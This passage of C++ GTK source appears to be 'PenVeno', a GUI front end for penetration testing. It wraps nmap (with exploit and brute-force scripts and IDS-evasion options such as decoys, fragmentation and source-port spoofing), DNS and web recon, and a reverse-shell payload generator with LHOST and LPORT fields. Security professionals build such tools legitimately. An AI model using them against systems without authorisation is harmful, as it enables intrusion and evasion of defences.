#include <gtkmm.h>
#include <cairomm/cairomm.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <sstream>
#include <fstream>
#include <thread>
#include <mutex>
#include <queue>
#include <regex>
#include <algorithm>
#include <chrono>
#include <ctime>
#include <iomanip>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/evp.h>

namespace SecurityUtils {

    // Sanitize target host / IP / CIDR / URL
    inline bool is_valid_target(const std::string& target) {
        if (target.empty() || target.length() > 255) return false;
        // Allow alphanumeric, dots, dashes, underscores, slashes, colons
        static const std::regex target_regex(R"(^[a-zA-Z0-9_\-\.\:\/]+$)");
        return std::regex_match(target, target_regex);
    }

    // Normalize target into web URL
    inline std::string normalize_url(const std::string& target, bool default_https = true) {
        if (target.rfind("http://", 0) == 0 || target.rfind("https://", 0) == 0) {
            return target;
        }
        return (default_https ? "https://" : "http://") + target;
    }

    // Extract bare hostname or IP (stripping protocol, port, trailing path)
    inline std::string extract_host_domain(const std::string& target) {
        std::string h = target;
        if (h.rfind("http://", 0) == 0) h = h.substr(7);
        else if (h.rfind("https://", 0) == 0) h = h.substr(8);
        auto slash = h.find('/');
        if (slash != std::string::npos) h = h.substr(0, slash);
        auto colon = h.find(':');
        if (colon != std::string::npos) h = h.substr(0, colon);
        return h;
    }

    // Validate port (1 - 65535)
    inline bool is_valid_port(int port) {
        return port >= 1 && port <= 65535;
    }

    // Validate port string
    inline bool is_valid_port_str(const std::string& port_str) {
        if (port_str.empty()) return false;
        for (char c : port_str) {
            if (!isdigit(c)) return false;
        }
        try {
            int p = std::stoi(port_str);
            return is_valid_port(p);
        } catch (...) {
            return false;
        }
    }

    // Retrieve active local IPv4 interfaces
    inline std::vector<std::pair<std::string, std::string>> get_local_interfaces() {
        std::vector<std::pair<std::string, std::string>> interfaces;
        struct ifaddrs *ifaddr, *ifa;
        if (getifaddrs(&ifaddr) == -1) return interfaces;

        for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
            if (!ifa->ifa_addr) continue;
            if (ifa->ifa_addr->sa_family == AF_INET) {
                char ip_str[INET_ADDRSTRLEN];
                void* sin_addr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
                inet_ntop(AF_INET, sin_addr, ip_str, INET_ADDRSTRLEN);
                interfaces.push_back({ifa->ifa_name, ip_str});
            }
        }
        freeifaddrs(ifaddr);
        return interfaces;
    }

    // Compute cryptographic hash using OpenSSL EVP
    inline std::string compute_hash(const std::string& input, const char* algo) {
        const EVP_MD* md = EVP_get_digestbyname(algo);
        if (!md) return "Unsupported algorithm";
        unsigned char hash[EVP_MAX_MD_SIZE];
        unsigned int length = 0;
        EVP_MD_CTX* ctx = EVP_MD_CTX_new();
        if (!ctx) return "Failed to allocate CTX";
        EVP_DigestInit_ex(ctx, md, nullptr);
        EVP_DigestUpdate(ctx, input.c_str(), input.length());
        EVP_DigestFinal_ex(ctx, hash, &length);
        EVP_MD_CTX_free(ctx);

        std::ostringstream oss;
        for (unsigned int i = 0; i < length; ++i) {
            oss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
        }
        return oss.str();
    }

    // Identify hash algorithm by format and length
    inline std::string identify_hash(const std::string& raw_hash) {
        std::string hash = raw_hash;
        // Trim whitespace
        hash.erase(hash.begin(), std::find_if(hash.begin(), hash.end(), [](unsigned char ch) { return !std::isspace(ch); }));
        hash.erase(std::find_if(hash.rbegin(), hash.rend(), [](unsigned char ch) { return !std::isspace(ch); }).base(), hash.end());

        if (hash.empty()) return "Please enter a valid hash string.";

        size_t len = hash.length();
        bool is_hex = std::all_of(hash.begin(), hash.end(), [](char c) {
            return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        });

        std::ostringstream out;
        out << "Analysis for hash [" << hash << "] (Length: " << len << "):\n\n";

        if (hash.rfind("$2a$", 0) == 0 || hash.rfind("$2b$", 0) == 0 || hash.rfind("$2y$", 0) == 0) {
            out << "[+] Match: bcrypt\n";
            out << "    Hashcat Mode: -m 3200\n";
            out << "    John format: bcrypt\n";
            return out.str();
        }
        if (hash.rfind("$6$", 0) == 0) {
            out << "[+] Match: SHA-512 Crypt (Linux /etc/shadow)\n";
            out << "    Hashcat Mode: -m 1800\n";
            out << "    John format: sha512crypt\n";
            return out.str();
        }
        if (hash.rfind("$1$", 0) == 0) {
            out << "[+] Match: MD5 Crypt (Linux /etc/shadow)\n";
            out << "    Hashcat Mode: -m 500\n";
            out << "    John format: md5crypt\n";
            return out.str();
        }

        if (is_hex) {
            if (len == 32) {
                out << "[+] Likely: MD5 or NTLM\n";
                out << "    - MD5 (Hashcat: -m 0 | John: raw-md5)\n";
                out << "    - NTLM (Hashcat: -m 1000 | John: nt)\n";
                out << "    - MD4 (Hashcat: -m 900)\n";
            } else if (len == 40) {
                out << "[+] Likely: SHA-1\n";
                out << "    Hashcat: -m 100 | John: raw-sha1\n";
            } else if (len == 56) {
                out << "[+] Likely: SHA-224 / SHA3-224\n";
            } else if (len == 64) {
                out << "[+] Likely: SHA-256\n";
                out << "    Hashcat: -m 1400 | John: raw-sha256\n";
            } else if (len == 96) {
                out << "[+] Likely: SHA-384\n";
                out << "    Hashcat: -m 10800 | John: raw-sha384\n";
            } else if (len == 128) {
                out << "[+] Likely: SHA-512 or Whirlpool\n";
                out << "    Hashcat: -m 1700 | John: raw-sha512\n";
            } else {
                out << "[-] Unknown hex hash length (" << len << " chars).\n";
            }
        } else {
            out << "[-] Non-hex characters detected. Could be Base64-encoded or salted format.\n";
        }
        return out.str();
    }
}

class MainWindow : public Gtk::Window {
public:
    MainWindow() {
        set_title("PenVeno — Penetration Testing Suite v2.0");
        set_default_size(1040, 720);
        set_position(Gtk::WIN_POS_CENTER);

        load_custom_css();
        setup_ui();
        init_console_tags();
        refresh_network_interfaces();

        // Connect Dispatcher for cross-thread GUI updates
        log_dispatcher.connect(sigc::mem_fun(*this, &MainWindow::on_log_dispatched));
        process_finished_dispatcher.connect(sigc::mem_fun(*this, &MainWindow::on_process_finished));

        append_console_output("[✓] PenVeno v2.0 initialized successfully.\n");
        append_console_output("[✓] Core engine: Non-blocking asynchronous execution with active process management.\n");
        append_console_output("[✓] Ready for authorized penetration testing & security reconnaissance.\n\n");
    }

    ~MainWindow() override {
        stop_running_process();
        if (worker_thread.joinable()) {
            worker_thread.join();
        }
    }

private:
    // Process runner state
    std::thread worker_thread;
    pid_t current_pid{-1};
    std::mutex queue_mutex;
    std::queue<std::string> output_queue;
    Glib::Dispatcher log_dispatcher;
    Glib::Dispatcher process_finished_dispatcher;
    bool is_process_running{false};
    std::string current_task_name;

    // Discovered Hosts & Ports state
    struct ActiveHost {
        std::string ip;
        std::string hostname;
        std::set<std::string> ports;
    };
    std::map<std::string, ActiveHost> live_hosts;
    std::string current_scan_host;
    Gtk::ComboBoxText active_hosts_combo;

    // UI Widgets
    Gtk::Box main_vbox{Gtk::ORIENTATION_VERTICAL, 0};
    Gtk::Box header_box{Gtk::ORIENTATION_HORIZONTAL, 12};
    Gtk::Label title_label;
    Gtk::Label status_badge;
    Gtk::Spinner spinner;
    Gtk::Button stop_button{"⏹ Stop Process"};

    Gtk::Paned vpaned{Gtk::ORIENTATION_VERTICAL};
    Gtk::Box top_panel{Gtk::ORIENTATION_HORIZONTAL, 6};
    Gtk::Stack stack;
    Gtk::StackSidebar sidebar;

    // Tool Panels
    Gtk::ScrolledWindow nmap_scroll;
    Gtk::Box nmap_panel{Gtk::ORIENTATION_VERTICAL, 10};
    Gtk::ScrolledWindow dns_scroll;
    Gtk::Box dns_panel{Gtk::ORIENTATION_VERTICAL, 12};
    Gtk::ScrolledWindow payload_scroll;
    Gtk::Box payload_panel{Gtk::ORIENTATION_VERTICAL, 12};
    Gtk::Box wordlist_panel{Gtk::ORIENTATION_VERTICAL, 12};
    Gtk::Box hash_panel{Gtk::ORIENTATION_VERTICAL, 12};

    // Output Console Widgets
    Gtk::Box console_panel{Gtk::ORIENTATION_VERTICAL, 6};
    Gtk::Box console_header{Gtk::ORIENTATION_HORIZONTAL, 8};
    Gtk::Label console_title{"Terminal & Scan Output"};
    Gtk::Button clear_console_btn{"Clear"};
    Gtk::Button copy_console_btn{"Copy All"};
    Gtk::Button export_console_btn{"Export Report"};
    Gtk::CheckButton autoscroll_check{"Auto-Scroll"};
    Gtk::ScrolledWindow console_scroll;
    Gtk::TextView console_view;
    Glib::RefPtr<Gtk::TextBuffer> console_buffer;

    // --- Inputs for Unified Nmap Scanner ---
    Gtk::Entry nmap_target_entry;
    Gtk::ComboBoxText nmap_profile_combo;
    Gtk::ComboBoxText nmap_port_scope_combo;
    Gtk::Label nmap_port_custom_label{"Port / Top-N:"};
    Gtk::Entry nmap_port_custom_entry;

    // Primary flags
    Gtk::CheckButton nmap_sv_check{"Service Version (-sV)"};
    Gtk::CheckButton nmap_os_check{"OS Detection (-O)"};
    Gtk::CheckButton nmap_agg_check{"Aggressive Scan (-A)"};
    Gtk::CheckButton nmap_sc_check{"Default Scripts (-sC)"};
    Gtk::CheckButton nmap_vuln_check{"Vulnerability Scan (--script vuln)"};
    Gtk::CheckButton nmap_pn_check{"Treat as Online (-Pn)"};
    Gtk::CheckButton nmap_t4_check{"Fast Timing (-T4)"};
    Gtk::CheckButton nmap_open_check{"Open Ports Only (--open)"};

    // Expander 1: Scan Techniques & Ping
    Gtk::ComboBoxText nmap_scan_type_combo;
    Gtk::ComboBoxText nmap_ping_type_combo;
    Gtk::CheckButton nmap_traceroute_check{"Traceroute (--traceroute)"};

    // Expander 2: NSE Scripts & Firewall Evasion
    Gtk::CheckButton nmap_auth_check{"Auth & Brute Force (--script auth)"};
    Gtk::CheckButton nmap_exploit_check{"Exploit Testing (--script exploit)"};
    Gtk::CheckButton nmap_malware_check{"Malware Checks (--script malware)"};
    Gtk::CheckButton nmap_discovery_check{"Discovery Scripts (--script discovery)"};
    Gtk::Entry nmap_custom_script_entry;
    Gtk::CheckButton nmap_frag_check{"Fragment Packets (-f)"};
    Gtk::CheckButton nmap_badsum_check{"Bad Checksum (--badsum)"};
    Gtk::CheckButton nmap_decoy_check{"Decoy Scan (-D RND:5)"};
    Gtk::CheckButton nmap_srcport_check{"Spoof Port 53 (--source-port 53)"};

    // Expander 3: Timing, Verbosity & Diagnostics
    Gtk::ComboBoxText nmap_timing_combo;
    Gtk::ComboBoxText nmap_verbose_combo;
    Gtk::CheckButton nmap_trace_check{"Packet Trace (--packet-trace)"};
    Gtk::CheckButton nmap_reason_check{"Port State Reason (--reason)"};

    // Live command preview and action
    Gtk::Entry nmap_cmd_preview_entry;
    Gtk::Button nmap_copy_cmd_btn{"📋 Copy Command"};
    Gtk::Button nmap_run_btn{"▶ Launch Scan"};

    // --- Inputs for DNS & Web Recon ---
    Gtk::Entry dns_target_entry;
    Gtk::Button dns_sync_target_btn{"🎯 Use Live Target"};
    Gtk::ComboBoxText dns_mode_combo;
    Gtk::Box dns_web_options_box{Gtk::ORIENTATION_VERTICAL, 8};
    Gtk::ComboBoxText dns_wordlist_preset_combo;
    Gtk::Entry dns_wordlist_entry;
    Gtk::Button dns_wordlist_browse_btn{"Browse..."};
    Gtk::Entry dns_ext_entry;
    Gtk::Entry dns_status_entry;
    Gtk::ComboBoxText dns_threads_combo;
    Gtk::Entry dns_cmd_preview_entry;
    Gtk::Button dns_copy_cmd_btn{"📋 Copy Command"};
    Gtk::Button dns_run_btn{"▶ Launch Recon Task"};

    // --- Inputs for Payload Generator ---
    Gtk::ComboBoxText payload_os_combo;
    Gtk::ComboBoxText payload_lhost_combo;
    Gtk::Button payload_refresh_ip_btn{"🔄 Refresh IPs"};
    Gtk::Entry payload_lhost_custom_entry;
    Gtk::Entry payload_lport_entry;
    Gtk::ComboBoxText payload_encoder_combo;
    Gtk::Entry payload_iterations_entry;
    Gtk::Entry payload_badchars_entry;
    Gtk::Entry payload_template_entry;
    Gtk::Button payload_template_browse_btn{"Browse..."};
    Gtk::CheckButton payload_template_keep_check{"Keep Execution (-k)"};
    Gtk::Entry payload_output_entry;
    Gtk::Button payload_browse_btn{"Browse..."};
    Gtk::Entry payload_cmd_preview_entry;
    Gtk::Button payload_copy_cmd_btn{"📋 Copy Command"};
    Gtk::Button payload_gen_handler_btn{"📜 Gen Handler (.rc)"};
    Gtk::Button payload_run_btn{"▶ Generate Payload"};

    // --- Inputs for Crunch Wordlist ---
    Gtk::Entry wordlist_min_entry;
    Gtk::Entry wordlist_max_entry;
    Gtk::ComboBoxText wordlist_charset_combo;
    Gtk::Entry wordlist_custom_charset_entry;
    Gtk::Entry wordlist_output_entry;
    Gtk::Button wordlist_browse_btn{"Browse..."};
    Gtk::Label wordlist_info_label;
    Gtk::Button wordlist_run_btn{"Generate Wordlist"};

    // --- Inputs for Hash Tools ---
    Gtk::Entry hash_input_entry;
    Gtk::Button hash_identify_btn{"Analyze & Identify Hash"};
    Gtk::Entry hash_plain_entry;
    Gtk::Button hash_generate_btn{"Generate Hashes (MD5, SHA1, SHA256, SHA512)"};

    void load_custom_css() {
        auto css_provider = Gtk::CssProvider::create();
        const std::string css = R"(
            window {
                background-color: #1e1e2e;
                color: #cdd6f4;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            }
            .header-bar {
                background-color: #181825;
                padding: 10px 16px;
                border-bottom: 2px solid #313244;
            }
            .header-title {
                font-size: 18px;
                font-weight: bold;
                color: #89b4fa;
            }
            .status-badge {
                font-size: 12px;
                font-weight: bold;
                padding: 4px 10px;
                border-radius: 12px;
                background-color: #313244;
                color: #a6adc8;
            }
            .status-badge.running {
                background-color: #f9e2af;
                color: #11111b;
            }
            .status-badge.idle {
                background-color: #a6e3a1;
                color: #11111b;
            }
            .sidebar-nav {
                background-color: #181825;
                border-right: 1px solid #313244;
                min-width: 200px;
            }
            .tool-page {
                padding: 20px;
                background-color: #1e1e2e;
            }
            .form-header {
                font-size: 16px;
                font-weight: bold;
                color: #cdd6f4;
                margin-bottom: 12px;
            }
            .action-btn {
                background-color: #89b4fa;
                color: #11111b;
                font-weight: bold;
                padding: 8px 18px;
                border-radius: 6px;
                border: none;
            }
            .action-btn:hover {
                background-color: #b4befe;
            }
            .stop-btn {
                background-color: #f38ba8;
                color: #11111b;
                font-weight: bold;
                border-radius: 6px;
                padding: 6px 14px;
            }
            .stop-btn:hover {
                background-color: #eba0ac;
            }
            .console-panel {
                background-color: #11111b;
                border-top: 2px solid #313244;
                padding: 8px 12px;
            }
            .console-view {
                background-color: #11111b;
                color: #a6e3a1;
                font-family: 'DejaVu Sans Mono', 'Consolas', 'Courier New', monospace;
                font-size: 12px;
                padding: 8px;
            }
            entry, combobox button {
                background-color: #313244;
                color: #cdd6f4;
                border: 1px solid #45475a;
                border-radius: 5px;
                padding: 5px 8px;
            }
            entry:focus {
                border-color: #89b4fa;
            }
        )";

        try {
            css_provider->load_from_data(css);
            auto screen = Gdk::Screen::get_default();
            Gtk::StyleContext::add_provider_for_screen(screen, css_provider, GTK_STYLE_PROVIDER_PRIORITY_APPLICATION);
        } catch (const Gtk::CssProviderError& ex) {
            std::cerr << "CSS Load Error: " << ex.what() << std::endl;
        }
    }

    void setup_ui() {
        add(main_vbox);

        // --- Top Header Bar ---
        header_box.get_style_context()->add_class("header-bar");
        title_label.set_markup("<b>🛡️ PenVeno 2.0</b> <span color='#a6adc8'>| Penetration Testing Suite</span>");
        title_label.get_style_context()->add_class("header-title");
        header_box.pack_start(title_label, Gtk::PACK_SHRINK);

        header_box.pack_start(spinner, Gtk::PACK_SHRINK);
        status_badge.set_text("IDLE");
        status_badge.get_style_context()->add_class("status-badge");
        status_badge.get_style_context()->add_class("idle");
        header_box.pack_start(status_badge, Gtk::PACK_SHRINK);

        stop_button.get_style_context()->add_class("stop-btn");
        stop_button.set_sensitive(false);
        stop_button.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_stop_clicked));
        header_box.pack_end(stop_button, Gtk::PACK_SHRINK);

        main_vbox.pack_start(header_box, Gtk::PACK_SHRINK);

        // --- Paned Split (Top: Tools, Bottom: Console) ---
        main_vbox.pack_start(vpaned, Gtk::PACK_EXPAND_WIDGET);

        // --- Top Panel: Sidebar + Stack ---
        sidebar.set_stack(stack);
        sidebar.get_style_context()->add_class("sidebar-nav");
        top_panel.pack_start(sidebar, Gtk::PACK_SHRINK);
        top_panel.pack_start(stack, Gtk::PACK_EXPAND_WIDGET);

        vpaned.pack1(top_panel, true, false);

        // Build Stack Pages
        build_nmap_panel();
        build_dns_panel();
        build_payload_panel();
        build_wordlist_panel();
        build_hash_panel();

        // --- Bottom Panel: Integrated Terminal Console ---
        build_console_panel();
        vpaned.pack2(console_panel, false, false);
        vpaned.set_position(360);

        show_all_children();
    }

    // --- Unified Nmap Master Scanner ---
    void build_nmap_panel() {
        nmap_panel.get_style_context()->add_class("tool-page");

        // Top Heading
        Gtk::Label* header = Gtk::manage(new Gtk::Label("Unified Nmap Master Scanner & Visual Flag Builder"));
        header->get_style_context()->add_class("form-header");
        header->set_xalign(0);
        nmap_panel.pack_start(*header, Gtk::PACK_SHRINK);

        // Target & Quick Preset Row
        Gtk::Box* target_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* t_lbl = Gtk::manage(new Gtk::Label("Target IP / Host / Subnet:"));
        t_lbl->set_xalign(0);
        nmap_target_entry.set_placeholder_text("e.g. 192.168.1.1 or scanme.nmap.org or 192.168.1.0/24");
        nmap_target_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_nmap_command_preview));

        Gtk::Label* p_lbl = Gtk::manage(new Gtk::Label("Preset Profile:"));
        nmap_profile_combo.append("Custom Selection");
        nmap_profile_combo.append("🚀 Fast Host Discovery (-sn -v)");
        nmap_profile_combo.append("⚡ Quick Scan Top 100 (-F -T4)");
        nmap_profile_combo.append("🔍 Standard Service Scan (-sV -sC -T4)");
        nmap_profile_combo.append("💥 Full Port Blitz (All Ports -p-, -sV, -sC, -O, -A)");
        nmap_profile_combo.append("🛡️ Vulnerability Audit (-sV --script vuln)");
        nmap_profile_combo.append("🥷 Stealth SYN Scan (-sS -Pn -f -T2)");
        nmap_profile_combo.append("🌐 Web Server Audit (-p 80,443,8080 --script http-*)");
        nmap_profile_combo.set_active(0);
        nmap_profile_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::on_nmap_preset_changed));

        target_row->pack_start(*t_lbl, Gtk::PACK_SHRINK);
        target_row->pack_start(nmap_target_entry, Gtk::PACK_EXPAND_WIDGET);
        target_row->pack_start(*p_lbl, Gtk::PACK_SHRINK);
        target_row->pack_start(nmap_profile_combo, Gtk::PACK_SHRINK);
        nmap_panel.pack_start(*target_row, Gtk::PACK_SHRINK);

        // Active Discovered Hosts Quick-Select Row
        Gtk::Box* active_hosts_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* act_lbl = Gtk::manage(new Gtk::Label("Discovered Live Targets:"));
        active_hosts_combo.append("", "Select Live Target (Run a scan to populate)");
        active_hosts_combo.set_active(0);
        active_hosts_combo.signal_changed().connect([this]() {
            std::string id = active_hosts_combo.get_active_id();
            if (!id.empty()) {
                nmap_target_entry.set_text(id);
                update_nmap_command_preview();
            }
        });
        active_hosts_row->pack_start(*act_lbl, Gtk::PACK_SHRINK);
        active_hosts_row->pack_start(active_hosts_combo, Gtk::PACK_EXPAND_WIDGET);
        nmap_panel.pack_start(*active_hosts_row, Gtk::PACK_SHRINK);

        // Port Scope Row
        Gtk::Box* port_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* ps_lbl = Gtk::manage(new Gtk::Label("Port Selection Scope:"));
        nmap_port_scope_combo.append("Top 100 Fast Ports (-F)");
        nmap_port_scope_combo.append("Standard Top 1000 Ports (Default)");
        nmap_port_scope_combo.append("All Ports 1-65535 (-p-)");
        nmap_port_scope_combo.append("Top N Ports (--top-ports)");
        nmap_port_scope_combo.append("Core Web & Admin Ports (21,22,23,25,53,80,110,139,143,443,445,1433,3306,3389,8080)");
        nmap_port_scope_combo.append("Custom Port / Range (-p)");
        nmap_port_scope_combo.set_active(1);
        nmap_port_scope_combo.signal_changed().connect([this]() {
            std::string text = nmap_port_scope_combo.get_active_text();
            if (text.find("Top N Ports") != std::string::npos || text.find("Custom Port / Range") != std::string::npos) {
                nmap_port_custom_label.show();
                nmap_port_custom_entry.show();
                if (text.find("Top N Ports") != std::string::npos && nmap_port_custom_entry.get_text().empty()) {
                    nmap_port_custom_entry.set_text("50");
                }
            } else {
                nmap_port_custom_label.hide();
                nmap_port_custom_entry.hide();
            }
            update_nmap_command_preview();
        });

        nmap_port_custom_entry.set_placeholder_text("e.g. 50 or 80,443,8000-8100");
        nmap_port_custom_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_nmap_command_preview));

        port_row->pack_start(*ps_lbl, Gtk::PACK_SHRINK);
        port_row->pack_start(nmap_port_scope_combo, Gtk::PACK_EXPAND_WIDGET);
        port_row->pack_start(nmap_port_custom_label, Gtk::PACK_SHRINK);
        port_row->pack_start(nmap_port_custom_entry, Gtk::PACK_SHRINK);
        nmap_panel.pack_start(*port_row, Gtk::PACK_SHRINK);

        nmap_port_custom_label.hide();
        nmap_port_custom_entry.hide();

        // Primary Common Flags Checkbox Grid
        Gtk::Box* flags_row1 = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 12));
        nmap_sv_check.set_active(true);
        nmap_t4_check.set_active(true);

        auto connect_flag = [this](Gtk::CheckButton& cb) {
            cb.signal_toggled().connect(sigc::mem_fun(*this, &MainWindow::update_nmap_command_preview));
        };

        connect_flag(nmap_sv_check);
        connect_flag(nmap_os_check);
        connect_flag(nmap_agg_check);
        connect_flag(nmap_sc_check);
        connect_flag(nmap_vuln_check);
        connect_flag(nmap_pn_check);
        connect_flag(nmap_t4_check);
        connect_flag(nmap_open_check);

        flags_row1->pack_start(nmap_sv_check, Gtk::PACK_SHRINK);
        flags_row1->pack_start(nmap_os_check, Gtk::PACK_SHRINK);
        flags_row1->pack_start(nmap_agg_check, Gtk::PACK_SHRINK);
        flags_row1->pack_start(nmap_sc_check, Gtk::PACK_SHRINK);
        nmap_panel.pack_start(*flags_row1, Gtk::PACK_SHRINK);

        Gtk::Box* flags_row2 = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 12));
        flags_row2->pack_start(nmap_vuln_check, Gtk::PACK_SHRINK);
        flags_row2->pack_start(nmap_pn_check, Gtk::PACK_SHRINK);
        flags_row2->pack_start(nmap_t4_check, Gtk::PACK_SHRINK);
        flags_row2->pack_start(nmap_open_check, Gtk::PACK_SHRINK);
        nmap_panel.pack_start(*flags_row2, Gtk::PACK_SHRINK);

        // Collapsible Expander 1: Scan Techniques & Ping
        Gtk::Expander* exp1 = Gtk::manage(new Gtk::Expander("⚙️ Advanced Scan Techniques & Ping Probes"));
        Gtk::Box* exp1_box = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_VERTICAL, 6));

        Gtk::Box* tech_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* st_lbl = Gtk::manage(new Gtk::Label("Scan Type:"));
        nmap_scan_type_combo.append("Default (TCP SYN / Connect)");
        nmap_scan_type_combo.append("TCP SYN Stealth (-sS)");
        nmap_scan_type_combo.append("TCP Connect (-sT)");
        nmap_scan_type_combo.append("UDP Scan (-sU)");
        nmap_scan_type_combo.append("Ping Sweep Only / No Port Scan (-sn)");
        nmap_scan_type_combo.append("TCP FIN Scan (-sF)");
        nmap_scan_type_combo.append("TCP Null Scan (-sN)");
        nmap_scan_type_combo.append("TCP Xmas Scan (-sX)");
        nmap_scan_type_combo.append("TCP ACK Scan (-sA)");
        nmap_scan_type_combo.set_active(0);
        nmap_scan_type_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_nmap_command_preview));

        Gtk::Label* pt_lbl = Gtk::manage(new Gtk::Label("Ping Probe:"));
        nmap_ping_type_combo.append("Default Ping");
        nmap_ping_type_combo.append("ICMP Echo Request (-PE)");
        nmap_ping_type_combo.append("ICMP Timestamp (-PP)");
        nmap_ping_type_combo.append("ARP Ping (-PR)");
        nmap_ping_type_combo.set_active(0);
        nmap_ping_type_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_nmap_command_preview));

        connect_flag(nmap_traceroute_check);

        tech_row->pack_start(*st_lbl, Gtk::PACK_SHRINK);
        tech_row->pack_start(nmap_scan_type_combo, Gtk::PACK_EXPAND_WIDGET);
        tech_row->pack_start(*pt_lbl, Gtk::PACK_SHRINK);
        tech_row->pack_start(nmap_ping_type_combo, Gtk::PACK_EXPAND_WIDGET);
        tech_row->pack_start(nmap_traceroute_check, Gtk::PACK_SHRINK);
        exp1_box->pack_start(*tech_row, Gtk::PACK_SHRINK);
        exp1->add(*exp1_box);
        nmap_panel.pack_start(*exp1, Gtk::PACK_SHRINK);

        // Collapsible Expander 2: NSE Scripts & Firewall Evasion
        Gtk::Expander* exp2 = Gtk::manage(new Gtk::Expander("📜 NSE Security Scripts & Firewall Evasion"));
        Gtk::Box* exp2_box = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_VERTICAL, 6));

        Gtk::Box* nse_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        connect_flag(nmap_auth_check);
        connect_flag(nmap_exploit_check);
        connect_flag(nmap_malware_check);
        connect_flag(nmap_discovery_check);

        nse_row->pack_start(nmap_auth_check, Gtk::PACK_SHRINK);
        nse_row->pack_start(nmap_exploit_check, Gtk::PACK_SHRINK);
        nse_row->pack_start(nmap_malware_check, Gtk::PACK_SHRINK);
        nse_row->pack_start(nmap_discovery_check, Gtk::PACK_SHRINK);
        exp2_box->pack_start(*nse_row, Gtk::PACK_SHRINK);

        Gtk::Box* custom_script_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* cs_lbl = Gtk::manage(new Gtk::Label("Custom NSE Script(s):"));
        nmap_custom_script_entry.set_placeholder_text("e.g. http-title,ssl-cert,banner");
        nmap_custom_script_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_nmap_command_preview));
        custom_script_row->pack_start(*cs_lbl, Gtk::PACK_SHRINK);
        custom_script_row->pack_start(nmap_custom_script_entry, Gtk::PACK_EXPAND_WIDGET);
        exp2_box->pack_start(*custom_script_row, Gtk::PACK_SHRINK);

        Gtk::Box* evade_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        connect_flag(nmap_frag_check);
        connect_flag(nmap_badsum_check);
        connect_flag(nmap_decoy_check);
        connect_flag(nmap_srcport_check);

        evade_row->pack_start(nmap_frag_check, Gtk::PACK_SHRINK);
        evade_row->pack_start(nmap_badsum_check, Gtk::PACK_SHRINK);
        evade_row->pack_start(nmap_decoy_check, Gtk::PACK_SHRINK);
        evade_row->pack_start(nmap_srcport_check, Gtk::PACK_SHRINK);
        exp2_box->pack_start(*evade_row, Gtk::PACK_SHRINK);
        exp2->add(*exp2_box);
        nmap_panel.pack_start(*exp2, Gtk::PACK_SHRINK);

        // Collapsible Expander 3: Timing, Verbosity & Diagnostics
        Gtk::Expander* exp3 = Gtk::manage(new Gtk::Expander("⏱️ Timing, Diagnostics & Output Verbosity"));
        Gtk::Box* exp3_box = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_VERTICAL, 6));

        Gtk::Box* diag_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* tm_lbl = Gtk::manage(new Gtk::Label("Timing:"));
        nmap_timing_combo.append("T4 - Aggressive (Fast & Recommended)");
        nmap_timing_combo.append("T3 - Normal (Default)");
        nmap_timing_combo.append("T2 - Polite (Slow & Gentle)");
        nmap_timing_combo.append("T1 - Sneaky (IDS Evasion)");
        nmap_timing_combo.append("T0 - Paranoid (Extremely Slow)");
        nmap_timing_combo.append("T5 - Insane (Fastest Local Network)");
        nmap_timing_combo.set_active(0);
        nmap_timing_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_nmap_command_preview));

        Gtk::Label* vb_lbl = Gtk::manage(new Gtk::Label("Verbosity:"));
        nmap_verbose_combo.append("Normal Verbosity");
        nmap_verbose_combo.append("Verbose (-v)");
        nmap_verbose_combo.append("Very Verbose (-vv)");
        nmap_verbose_combo.set_active(0);
        nmap_verbose_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_nmap_command_preview));

        connect_flag(nmap_trace_check);
        connect_flag(nmap_reason_check);

        diag_row->pack_start(*tm_lbl, Gtk::PACK_SHRINK);
        diag_row->pack_start(nmap_timing_combo, Gtk::PACK_EXPAND_WIDGET);
        diag_row->pack_start(*vb_lbl, Gtk::PACK_SHRINK);
        diag_row->pack_start(nmap_verbose_combo, Gtk::PACK_EXPAND_WIDGET);
        diag_row->pack_start(nmap_trace_check, Gtk::PACK_SHRINK);
        diag_row->pack_start(nmap_reason_check, Gtk::PACK_SHRINK);
        exp3_box->pack_start(*diag_row, Gtk::PACK_SHRINK);
        exp3->add(*exp3_box);
        nmap_panel.pack_start(*exp3, Gtk::PACK_SHRINK);

        // Live Command Preview & Action Bar
        Gtk::Box* cmd_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 8));
        Gtk::Label* cmd_lbl = Gtk::manage(new Gtk::Label("Live Command:"));
